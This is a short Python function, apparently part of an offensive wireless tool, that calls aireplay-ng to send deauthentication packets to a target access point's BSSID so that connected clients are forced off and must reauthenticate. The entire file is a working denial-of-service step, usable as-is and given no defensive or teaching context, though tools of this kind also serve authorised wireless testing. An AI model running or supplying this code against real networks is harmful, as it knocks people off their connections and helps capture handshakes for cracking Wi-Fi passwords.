import subprocess

def perform_deauth_attack(interface, bssid):
    print("[+] Sending deauth packets to force reauth")
    try:
        subprocess.run([
            "aireplay-ng", "--deauth", "10",
            "-a", bssid,
            interface
        ])
    except KeyboardInterrupt:
        print("[!] Deauth attack interrupted.")
